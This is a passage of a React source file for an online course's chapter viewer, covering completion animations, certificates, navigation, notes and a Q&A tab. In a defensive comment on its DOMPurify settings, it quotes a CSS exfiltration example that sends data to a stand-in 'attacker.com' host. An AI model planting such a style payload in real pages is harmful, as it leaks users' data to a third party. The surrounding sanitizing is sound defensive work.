        }
      }
    }

    // Stale chapter_progress rows (chapters edited/deleted after a learner
    // enrolled) must not count toward completion, or the arc fires early —
    // only progress rows pointing at a chapter that still exists count.
    const completedCount = liveChapterIds
      ? completedRows.filter((p) => liveChapterIds.has(p.chapter_id)).length
      : completedRows.length;

    // Is the whole course finished now? Completion-based (authoritative count),
    // not positional — a student who finishes lessons out of order still gets
    // the arc on the lesson that actually takes them to 100%.
    const isCourseDone =
      totalCount !== null && totalCount > 0 && completedCount >= totalCount;

    // Mid-course milestones celebrate with the banner + confetti. The
    // course-done moment is owned by the arc (ring → takeover → recap) instead,
    // so we suppress the banner there to keep a single celebration on screen.
    const hit =
      !isCourseDone && totalCount !== null && totalCount > 0
        ? checkMilestone(completedCount - 1, completedCount, totalCount)
        : null;

    if (hit) {
      setShowConfetti(true);
      setMilestone(hit);
      hapticNotification("success");
      toast.success(hit.title, { description: hit.subtitle, duration: 4000 });
      confettiTimerRef.current = setTimeout(() => { setShowConfetti(false); setMilestone(null); }, 4000);
    } else if (!isCourseDone) {
      toast.success("Nice work! Chapter done.");
    }

    // Auto-generate certificate if threshold reached. Only with a verified
    // total: a bogus denominator here could issue certificates early (the
    // issue_certificate RPC re-checks server-side, but don't even try).
    if (totalCount !== null && totalCount > 0) {
      checkAndGenerateCertificate(
        user.id,
        courseId,
        completedCount,
        totalCount,
        profile?.full_name ?? "Student",
        profile?.member_number != null ? String(profile.member_number) : null
      ).then((cert) => {
        if (cert) {
          toast.success("Certificate earned!", {
            description: `Certificate ${cert.certificateNumber} has been generated.`,
            duration: 6000,
          });
        }
      });
    }

    // ── The completion arc, beat 1: the ring animates IN PLACE. Push the new
    // course totals so the needle springs from its current % to the new one
    // (bounce/emphasis on the ProgressRing), with a celebratory haptic. This
    // happens for every completion, before any overlay.
    setCourseCompleted(completedCount);
    if (typeof totalCount === "number") setCourseTotal(totalCount);
    void celebrate();

    // Beat 2 (course finished only): once the ring has settled, the takeover
    // enters; the recap then follows the takeover's exit (see render + the
    // arc handlers). Reduced motion collapses the beat to an instant cut but
    // preserves the ring → takeover → recap ORDER.
    if (isCourseDone) {
      if (arcTimerRef.current) clearTimeout(arcTimerRef.current);
      const beat = motionSafe.reduced ? 0 : 900;
      arcTimerRef.current = setTimeout(() => setArcPhase("takeover"), beat);
      return;
    }

    // Mid-course: auto-advance to next after the ring beat (with safety check);
    // delay longer if a milestone banner is showing.
    const advanceDelay = hit ? 2500 : 900;
    if (siblings && currentIndex >= 0 && currentIndex < siblings.length - 1 && siblings[currentIndex + 1]?.id) {
      autoAdvanceTimerRef.current = setTimeout(() => {
        hapticImpact("light");
        navigate(`/chapters/${siblings[currentIndex + 1].id}`);
      }, advanceDelay);
    }
  };

  const handlePostQuestion = async () => {
    if (!questionText.trim() || !user || !chapterId) return;
    setSubmitting(true);
    const { error } = await supabase.from("chapter_qna").insert({
      chapter_id: chapterId,
      user_id: user.id,
      question_text: questionText.trim(),
    });
    if (error) toast.error("Your question didn't send. Try again.");
    else {
      toast.success("Question sent. Your instructor will see it.");
      setQuestionText("");
      refreshQna();
    }
    setSubmitting(false);
  };

  // Full-screen spinner ONLY on the very first load (no chapter yet). On
  // episode switches we keep the previous chapter + the whole shell mounted
  // (stale-while-revalidate) so the page never flashes to a black screen and
  // switching feels near-instant; a thin top progress bar (below) signals the
  // in-flight fetch instead.
  if (loading && !chapter) {
    return (
      <div className="relative flex items-center justify-center min-h-screen bg-background">
        {/* This page renders outside StudentLayout, so even the first-load
            spinner needs an exit; a hung fetch must not strand the user. */}
        <Button
          variant="ghost"
          size="sm"
          onClick={() => navigate("/home")}
          className="absolute left-4 top-[calc(1rem+env(safe-area-inset-top))]"
        >
          <ArrowLeft className="h-4 w-4 mr-1" /> Home
        </Button>
        <div className="h-8 w-8 animate-spin rounded-full border-2 border-muted-foreground border-t-foreground" />
      </div>
    );
  }

  if (accessDenied) {
    return (
      <div className="flex flex-col items-center justify-center min-h-screen bg-background text-center px-4">
        <div className="w-16 h-16 rounded-full bg-surface-2 flex items-center justify-center mb-4">
          <Info className="h-8 w-8 text-muted-foreground" />
        </div>
        <h2 className="text-xl font-semibold mb-2">Enrolment required</h2>
        <p className="text-muted-foreground mb-6 max-w-md">
          You need to enrol in this course to access this chapter.
        </p>
        <div className="flex gap-3">
          <Button variant="outline" onClick={() => navigate("/learn?seg=courses")}>
            My Courses
          </Button>
          <Button
            onClick={() => navigate(courseId ? `/courses/${courseId}` : "/browse")}
            className="btn-champagne px-5 text-[hsl(var(--cream-text))]"
          >
            View Course
          </Button>
        </div>
      </div>
    );
  }

  if (!chapter) return null;

  return (
    <div className="min-h-screen bg-background text-foreground pb-[env(safe-area-inset-bottom)]">
      <Confetti active={showConfetti} />
      {milestone && (
        <div className="fixed top-20 left-1/2 -translate-x-1/2 z-[9998] milestone-banner">
          <div className="bg-card border border-border rounded-2xl px-4 sm:px-6 py-4 shadow-2xl text-center max-w-[calc(100vw-2rem)] sm:max-w-sm">
            <p className="text-lg font-semibold">{milestone.title}</p>
            <p className="text-sm text-muted-foreground mt-1">{milestone.subtitle}</p>
            <div className="mt-2 h-1.5 bg-surface-2 rounded-full overflow-hidden">
              <div className="h-full bg-[hsl(var(--cream))] rounded-full motion-safe:transition-all motion-safe:duration-sweep" style={{ width: `${milestone.pct}%` }} />
            </div>
          </div>
        </div>
      )}
      {/* The completion arc. Beat 1 (the in-place ring) fires in
          handleMarkComplete; here are beats 2 and 3. The takeover enters once
          the ring has settled; EVERY dismissal path (CTA, backdrop, close,
          Escape) moves the arc to `recapWait`, which flips the takeover shut so
          its exit animation plays. Only when that exit completes (`onExited`)
          does the recap enter — so the two overlays never share the screen.
          A route change / Android back mid-arc unmounts both; the takeover's
          own effect cleanup (the app's sole body-lock owner) restores scroll. */}
      <CompletionTakeover
        open={arcPhase === "takeover"}
        variant="course"
        title={courseTitle || "this course"}
        subtitle="You've finished every lesson. Onwards."
        artUrl={
          siblings.map((s) => s.thumbnail_url || s.vdocipher_thumbnail_url).find(Boolean) ||
          courseHeroImage ||
          null
        }
        continueLabel="See your recap"
        onContinue={() => setArcPhase("recapWait")}
        onShare={handleShare}
        onClose={() => setArcPhase("recapWait")}
        onExited={() => setArcPhase((p) => (p === "recapWait" ? "recap" : p))}
      />
      <CompletionRecap
        open={arcPhase === "recap"}
        onClose={() => setArcPhase("recapOut")}
        onExited={() => {
          // Reached only after the glide-out has fully played (the recap exits
          // solely on the recap→recapOut dismissal), so it's safe to settle the
          // arc and navigate home here — deferred until the animation is done.
          setArcPhase("idle");
          navigate("/");
        }}
        courseTitle={courseTitle || "this course"}
        instructorName={courseInstructor}
        lessonsCompleted={courseCompleted}
        minutesWatched={courseWatchMinutes}
        imageUrl={
          courseHeroImage ||
          siblings.map((s) => s.thumbnail_url || s.vdocipher_thumbnail_url).find(Boolean) ||
          null
        }
      />

      {/* The dismissible screening-room surface. The completion overlays,
          milestone banner and confetti stay OUTSIDE this wrapper — they're
          `fixed`, and a transformed ancestor would re-root their positioning.
          The transform is bound only while a drag is live so the page never
          holds a permanent composited layer. */}
      <motion.div
        style={
          dragActive
            ? { y: dismissY, scale: dismissScale }
            : undefined
        }
        className={dragActive ? "relative origin-top will-change-transform" : undefined}
      >
        {/* Dim scrim — the dismiss "fade" without an ancestor opacity. A single
            flat-colour layer whose opacity animates composites cheaply, unlike
            subtree opacity which would flatten the whole surface (player iframe +
            blurred header + glow) into a re-composited group buffer per frame.
            Sits above the z-30 header so the darkening reads uniformly. */}
        {dragActive && (
          <motion.div
            aria-hidden
            className="pointer-events-none absolute inset-0 z-40 bg-background"
            style={{ opacity: dismissScrim }}
          />
        )}
        {/* Top bar — also the swipe-down-dismiss grab region (T3). Handlers live
            here and nowhere else, so page scroll outside this bar is untouched. */}
        <div
          onPointerDown={onHeaderPointerDown}
          onPointerMove={onHeaderPointerMove}
          onPointerUp={endHeaderDrag}
          onPointerCancel={endHeaderDrag}
          onClickCapture={onHeaderClickCapture}
          // `touch-action: none` ONLY on this grab region (never the page) makes
          // the JS drag the sole owner of a vertical pull that starts here: it
          // stops the iOS WKWebView rubber-band overscroll and the Android
          // native-scroll hand-off from firing alongside the transform, so the
          // gesture behaves identically on both platforms instead of
          // double-moving on iOS / failing to promote on Android. Left off under
          // reduced motion, where the drag is disabled and the header must keep
          // native touch behaviour. Page scroll outside this bar is untouched.
          style={motionSafe.reduced ? undefined : { touchAction: "none" }}
          className={cn(
            "sticky top-0 z-30 border-b border-border px-4 flex items-center gap-3 h-[calc(3.5rem+env(safe-area-inset-top))] pt-[env(safe-area-inset-top)]",
            // During a live dismiss drag, degrade the backdrop-blur to a solid
            // fill. A `backdrop-blur-xl` sticky header re-samples and re-blurs its
            // backdrop every frame as the ancestor scales/translates — one of the
            // heaviest per-frame costs on mid-range Android WebView. A solid
            // `bg-card` is visually near-identical over the near-black surface and
            // costs nothing to re-composite. Restored the instant the drag ends.
            dragActive ? "bg-card" : "bg-card/80 backdrop-blur-xl",
          )}
        >
          {/* Grab handle: the affordance that this surface pulls down to
              dismiss. Decorative + non-interactive; hidden under reduced
              motion where the gesture is disabled. */}
          {!motionSafe.reduced && (
            <span
              aria-hidden
              className="pointer-events-none absolute left-1/2 top-[calc(env(safe-area-inset-top)+3px)] h-1 w-9 -translate-x-1/2 rounded-full bg-foreground/25"
            />
          )}
        {/* In-flight episode-switch indicator: a thin pulsing bar pinned to
            the BOTTOM edge of the sticky header (below the Dynamic Island /
            safe-area inset so it's always visible) while the next lesson's
            data loads. The shell and previous lesson stay visible underneath
            (stale-while-revalidate) so there's no full-screen flash. Uses
            Tailwind's animate-pulse so no new CSS keyframe is needed. */}
        {loading && (
          <div className="absolute bottom-0 left-0 right-0 h-0.5 bg-[hsl(var(--cream))]/70 animate-pulse" />
        )}
        {/* ChapterViewer renders outside StudentLayout, so this button is
            the ONLY exit. Label where it actually goes: the course title
            when the courseId resolved, otherwise "Home" - never a "Back to
            course" that silently dumps the user on /home. */}
        <Button
          variant="ghost"
          size="sm"
          onClick={() => navigate(courseId ? `/courses/${courseId}` : "/home")}
          className="shrink-0 min-h-[44px] max-w-[45vw] sm:max-w-xs"
        >
          <ArrowLeft className="h-4 w-4 mr-1 shrink-0" />
          <span className="truncate">
            {courseId ? courseTitle || "Back to course" : "Home"}
          </span>
        </Button>
        <span className="text-sm text-muted-foreground truncate flex-1">
          {chapter.title}
        </span>
        {isCompleted && (
          <span className="flex items-center gap-1 text-xs text-[hsl(var(--accent-emerald))]">
            <CheckCircle2 className="h-3.5 w-3.5" /> Completed
          </span>
        )}
      </div>

      <div className="flex flex-col lg:flex-row pb-[env(safe-area-inset-bottom)]">
        {/* Main content - no fixed max-w so the player fills wide
            viewports (16-inch+, ultra-wide). Text blocks have their own
            per-element max-w to keep line lengths comfortable. */}
        <div className="flex-1 min-w-0 p-4 lg:p-8 xl:p-10 2xl:p-12 space-y-6">
          {/* Breadcrumb: hidden on mobile since top bar has back + title */}
          <div className="hidden sm:flex items-center gap-1.5 text-sm text-muted-foreground mb-4 flex-wrap">
            <Link to="/learn?seg=courses" className="hover:text-foreground transition-colors">My Courses</Link>
            <span>&rsaquo;</span>
            {courseId && courseTitle && (
              <>
                <Link to={`/courses/${courseId}`} className="hover:text-foreground transition-colors truncate">{courseTitle}</Link>
                <span>&rsaquo;</span>
              </>
            )}
            <span className="text-foreground truncate">{chapter.title}</span>
          </div>
          {/* Content renderer.
              All non-VdoCipher players get a borderless, slightly elevated
              shell - dropping the visible border in favour of a soft shadow
              reads as more premium and matches the offering page's
              cinematic feel. */}
          {/* Screening-room glow: a soft halo bloomed from the chapter's own
              thumbnail behind the player. AmbientGlow uses a tiny scaled <img>
              (never backdrop-filter, never the full-res frame) so the halo is
              cheap on Android WebView compositing. The thumbnail is the same
              small source the Up Next rail already uses. */}
          <AmbientGlow
            // Suspend the blurred halo while a dismiss drag is live: the scaling
            // ancestor invalidates its blur raster every frame. It's purely
            // decorative, so nulling the source renders nothing extra until the
            // gesture settles, then the bloom returns.
            src={dragActive ? null : (chapter.thumbnail_url ?? chapter.vdocipher_thumbnail_url)}
            width={320}
            // The player sits on the near-black chapter surface, so the muted
            // 0.22 / saturate-0.6 default collapsed into the black and the halo
            // never read. Lift the opacity and restore most of the colour so the
            // bloom actually blooms on a dark poster at phone widths. Still a
            // single blurred small <img> — no backdrop-filter, blur uncapped.
            intensity={0.42}
            saturate={0.95}
          >
            <div className="relative">
              <ChapterMediaPlayer chapter={chapter} updateProgress={updateProgress} lastPosition={lastPosition} />
              {/* Poster-hide the live media surface during a dismiss drag. The
                  cross-origin player (VdoCipher / Vimeo / YouTube iframe, the PDF
                  iframe, or the app-owned <video>) is the priciest layer to
                  re-composite under a scaling+translating ancestor. Occluding it
                  with a static poster lets Blink cull the live surface for the
                  duration of the gesture; it's removed the instant the drag
                  settles, so playback/scroll position is untouched. Only the
                  iframe/video content types need this — image/article surfaces
                  are cheap and are left visible. */}
              {dragActive &&
                (chapter.content_type === "video" ||
                  chapter.content_type === "pdf" ||
                  chapter.content_type === "embedded") && (
                  <div
                    aria-hidden
                    className="absolute inset-0 z-10 overflow-hidden rounded-2xl bg-black"
                  >
                    {(chapter.thumbnail_url || chapter.vdocipher_thumbnail_url) && (
                      <img
                        src={chapter.thumbnail_url || chapter.vdocipher_thumbnail_url}
                        alt=""
                        aria-hidden
                        className="h-full w-full object-cover"
                      />
                    )}
                  </div>
                )}
            </div>
          </AmbientGlow>

          {/* Chapter info - the Masterclass pattern: big title on the
              left with primary actions docked on the right. The title
              is the loudest element below the player; actions sit on
              the same baseline so the eye never has to drop twice. */}
          <div className="space-y-5">
            <div className="flex flex-col sm:flex-row sm:items-end sm:justify-between gap-4 sm:gap-6">
              <div className="space-y-2 flex-1 min-w-0">
                <div className="flex items-center gap-2.5">
                  {/* Course momentum ring. It animates IN PLACE on the bounce
                      register the moment a lesson completes — the first beat of
                      the completion arc — so the student watches the needle
                      move before the takeover enters. */}
                  {courseTotal > 0 && (
                    <ProgressRing
                      pct={coursePct}
                      size={34}
                      emphasis
                      className="shrink-0"
                    />
                  )}
                  {/* One counter family: the position ("Lesson N of M") and the
                      course-completion percent read as two clearly-labelled
                      metrics, never conflated. The ring is the graphical echo of
                      the completion percent — not a second number crowding the
                      position. */}
                  <p className="text-[11px] font-mono uppercase tracking-[0.22em] text-[hsl(var(--cream))]/70">
                    Lesson {currentIndex + 1} of {siblings.length}
                    {courseTotal > 0 && (
                      <span className="text-[hsl(var(--cream))]/60">
                        {" · "}
                        {coursePct}% complete
                      </span>
                    )}
                  </p>
                </div>
                <h1 className="text-2xl sm:text-4xl font-bold tracking-[-0.01em] leading-[1.1]">
                  {chapter.title}
                </h1>
              </div>
              <div className="flex items-center gap-2 shrink-0">
                <Button
                  variant="outline"
                  size="sm"
                  onClick={handleShare}
                  aria-label="Share"
                  className="h-11 min-w-[44px]"
                >
                  <Share2 className="h-4 w-4 sm:mr-2" />
                  <span className="hidden sm:inline">Share</span>
                </Button>
                {!isCompleted ? (
                  <Button
                    onClick={handleMarkComplete}
                    disabled={submitting}
                    size="sm"
                    className="btn-champagne h-11 px-4 font-semibold text-[hsl(var(--cream-text))] hover:-translate-y-0.5"
                  >
                    <CheckCircle2 className="h-4 w-4 mr-2" />
                    Mark complete
                  </Button>
                ) : (
                  <span className="flex items-center gap-1.5 text-xs text-[hsl(var(--accent-emerald))] font-medium px-2 h-11">
                    <CheckCircle2 className="h-4 w-4" /> Completed
                  </span>
                )}
              </div>
            </div>
            {chapter.description && (
              <p className="text-muted-foreground text-base leading-relaxed max-w-[68ch]">
                {chapter.description}
              </p>
            )}
          </div>

          {/* Nav buttons */}
          <div className="flex items-center justify-between pt-5 border-t border-border">
            <Button
              variant="outline"
              size="sm"
              disabled={currentIndex <= 0}
              onClick={() => navigate(`/chapters/${siblings[currentIndex - 1]?.id}`)}
              className="h-11 min-w-[44px]"
            >
              <ChevronLeft className="h-4 w-4 mr-1" /> Previous
            </Button>
            {/* Compact progress dots - shows location at a glance without
                taking the cognitive load of "12 / 15". Caps at 30 dots so
                very long courses don't blow out the row; falls back to
                a numeric counter past that. */}
            {siblings.length <= 30 ? (
              <div className="flex items-center gap-1.5">
                {siblings.map((_, i) => (
                  <span
                    key={i}
                    className={`h-1.5 rounded-full transition-all ${
                      i === currentIndex
                        ? "w-6 bg-[hsl(var(--cream))]"
                        : i < currentIndex
                        ? "w-1.5 bg-foreground/40"
                        : "w-1.5 bg-foreground/15"
                    }`}
                  />
                ))}
              </div>
            ) : (
              <span className="text-xs text-muted-foreground font-mono">
                {currentIndex + 1} / {siblings.length}
              </span>
            )}
            <Button
              variant="outline"
              size="sm"
              disabled={currentIndex >= siblings.length - 1}
              onClick={() => navigate(`/chapters/${siblings[currentIndex + 1]?.id}`)}
              className="h-11 min-w-[44px]"
            >
              Next <ChevronRight className="h-4 w-4 ml-1" />
            </Button>
          </div>

          {/* Quizzes */}
          {quizzes.length > 0 && (
            <div className="space-y-6 mt-8">
              <h3 className="text-lg font-semibold text-foreground">Knowledge Check</h3>
              {quizzes.map((quiz) => (
                <QuizBlock key={quiz.id} quiz={quiz} userId={user?.id} />
              ))}
            </div>
          )}
        </div>

        {/* Right sidebar - grows proportionally on wider viewports so
            it doesn't feel cramped next to a giant 2K+ player. */}
        <div className="lg:w-[380px] xl:w-[420px] 2xl:w-[480px] shrink-0 border-t lg:border-t-0 lg:border-l border-border p-4 lg:p-6">
          {/* Sidebar header: course context above the tabs, matching the
              Masterclass watching pattern where the course identity is
              always visible above the lesson navigator. */}
          {courseTitle && (
            <div className="flex items-center gap-3 pb-4 mb-4 border-b border-border">
              <div className="h-9 w-9 rounded-full bg-[hsl(var(--cream))]/15 flex items-center justify-center shrink-0">
                <ListVideo className="h-4 w-4 text-[hsl(var(--cream))]" />
              </div>
              <div className="min-w-0 flex-1">
                <p className="text-[10px] font-mono uppercase tracking-[0.22em] text-muted-foreground">
                  You're in
                </p>
                <p className="text-sm font-semibold truncate">{courseTitle}</p>
              </div>
            </div>
          )}
          <Tabs
            value={activeTab}
            onValueChange={(v) => {
              if (v === activeTab) return;
              void tapTick();
              setActiveTab(v as ChapterTab);
            }}
            className="w-full"
          >
            {/* Sliding cream pill glides between triggers via a shared
                framer `layoutId` on the glide spring (instant under reduced
                motion). Radix supplies the ARIA roles + keyboard nav; we
                suppress its default active background so the pill is the only
                active-state affordance and flip the active label to cream-text
                for contrast. The grid + h-11 keeps every trigger a >=44px
                target. */}
            <LayoutGroup id="chapter-tabs">
              <TabsList className="grid h-11 w-full grid-cols-5 gap-0.5">
                {CHAPTER_TABS.map((t) => {
                  const active = activeTab === t.key;
                  const Icon = TAB_ICONS[t.key];
                  const isQna = t.key === "qna";
                  const showQnaDot =
                    isQna &&
                    qna.some(
                      (q) =>
                        q.replies.some((r) => r.is_instructor_reply) &&
                        q.user_id === user?.id &&
                        !q.is_resolved,
                    );
                  return (
                    <TabsTrigger
                      key={t.key}
                      value={t.key}
                      aria-label={t.label}
                      className="relative h-full min-h-11 gap-1 px-1 text-xs transition-colors duration-base ease-out-expo data-[state=active]:bg-transparent data-[state=active]:text-[hsl(var(--cream-text))] data-[state=active]:shadow-none focus-visible:ring-[hsl(var(--cream))]"
                    >
                      {active && (
                        <motion.span
                          layoutId="chapter-tab-pill"
                          className="absolute inset-0.5 rounded-sm bg-[hsl(var(--cream))]"
                          transition={motionSafe.springs.glide}
                        />
                      )}
                      <Icon className="relative z-10 h-3.5 w-3.5" />
                      <span className="relative z-10 hidden md:inline">{t.label}</span>
                      {showQnaDot && (
                        <span className="absolute right-1.5 top-1.5 z-10 h-1.5 w-1.5 rounded-full bg-[hsl(var(--accent-emerald))] animate-pulse" />
                      )}
                    </TabsTrigger>
                  );
                })}
              </TabsList>
            </LayoutGroup>

            {/* Up Next - chapter navigator. Each tile shows lesson
                number badge, 16:9 thumbnail (or a numbered fallback when
                no thumbnail is set), title, and a description excerpt -
                Rahul's request: "lesson number, thumbnail, and description
                for sure" since that's what pulls the learner into the
                next lesson. The current lesson gets a cream tint + ring
                so it's anchored. */}
            <TabsContent value="upnext" className="mt-4 space-y-2">
              <UpNextList
                siblings={siblings}
                currentIndex={currentIndex}
                currentChapterId={chapter.id}
                courseId={courseId}
                currentCompleted={isCompleted}
                moduleTitle={currentModuleTitle}
              />
            </TabsContent>

            {/* Notes - per-chapter scratchpad, DB-backed via the
                chapter_notes table (load/save above), so they sync across
                every device the student signs in on. */}
            <TabsContent value="notes" className="mt-4 space-y-2">
              <div className="flex items-center justify-between">
                <p className="text-xs text-muted-foreground">
                  Your private notes for this lesson.
                </p>
                {notesSavedAt && (
                  <span className="text-[10px] font-mono text-[hsl(var(--accent-emerald))]/80 uppercase tracking-wider">
                    Saved
                  </span>
                )}
              </div>
              {/* font-size MUST stay >=16px on mobile or iOS WKWebView
                  fires focus auto-zoom, which yanks the page in and lets
                  the player iframe become a pan/scroll target. text-base
                  (16px) on touch viewports, drop to text-sm only from sm:
                  up where there's no zoom risk. */}
              <Textarea
                placeholder="Jot down what stood out…"
                value={notes}
                onChange={(e) => setNotes(e.target.value)}
                rows={10}
                className="text-base sm:text-sm resize-none"
              />
              <p className="text-[10px] text-muted-foreground/60">
                Syncs to your account. You'll see these notes on any device you sign in on.
              </p>
            </TabsContent>

            {/* Overview */}
            <TabsContent value="overview" className="mt-4 space-y-4">
              {chapter.description ? (
                <p className="text-sm text-muted-foreground leading-relaxed">
                  {chapter.description}
                </p>
              ) : (
                <p className="text-sm text-muted-foreground/60">No description for this chapter.</p>
              )}
              {chapter.article_body && (
                <div className="prose prose-invert prose-sm max-w-none">
                  {/*
                    DOMPurify config notes:
                    - `style` is intentionally NOT in ALLOWED_ATTR. Inline styles
                      permit CSS-based exfiltration (e.g. `background-image:
                      url('attacker.com/pixel?data=...')`) and can be used to
                      spoof UI chrome. Presentation stays in CSS classes.
                    - `FORCE_BODY` prevents DOMPurify from upgrading fragments
                      to full documents.
                    - `ALLOWED_URI_REGEXP` restricts anchor/img URLs to http(s)
                      and mailto, blocking `javascript:`, `data:`, and other
                      schemes that can bypass the tag filter.
                  */}
                  <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(chapter.article_body, {
                    ALLOWED_TAGS: ['p','br','strong','b','em','i','u','h1','h2','h3','h4','h5','h6','ul','ol','li','a','code','pre','blockquote','img','table','thead','tbody','tr','th','td','hr','span','div','figure','figcaption','sup','sub'],
                    ALLOWED_ATTR: ['href','target','rel','src','alt','width','height','class','id'],
                    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
                    FORCE_BODY: true,
                  }) }} />
                </div>
              )}
            </TabsContent>

            {/* Resources */}
            <TabsContent value="resources" className="mt-4 space-y-2">
              {resources.length === 0 ? (
                <p className="text-sm text-muted-foreground/60">No downloadable files for this chapter.</p>
              ) : (
                resources.map((r) => (
                  <a
                    key={r.id}
                    href={r.file_url}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="flex items-center gap-3 p-3 rounded-lg bg-surface hover:bg-accent/30 transition-colors text-sm"
                  >
                    <Download className="h-4 w-4 text-muted-foreground shrink-0" />
                    <span className="flex-1 truncate">{r.filename}</span>
                    {r.file_size_bytes && (
                      <span className="text-xs text-muted-foreground">
                        {(r.file_size_bytes / 1024).toFixed(0)}KB
                      </span>
                    )}
                  </a>
                ))
              )}
            </TabsContent>

            {/* Q&A: threaded discussion per chapter. Visually upgraded
                to match the cinematic UX of the rest of the watching
                page: editorial eyebrow, instructor-reply visual tagging,
                cleaner empty state. */}
            <TabsContent value="qna" className="mt-4 space-y-5">
              <ChapterQna
                qna={qna}
                questionText={questionText}
                setQuestionText={setQuestionText}
                onPost={handlePostQuestion}
                submitting={submitting}
                qnaLimit={qnaLimit}
                setQnaLimit={setQnaLimit}
              />
            </TabsContent>

          </Tabs>
        </div>
      </div>
      </motion.div>
    </div>
  );
};

export default ChapterViewer;
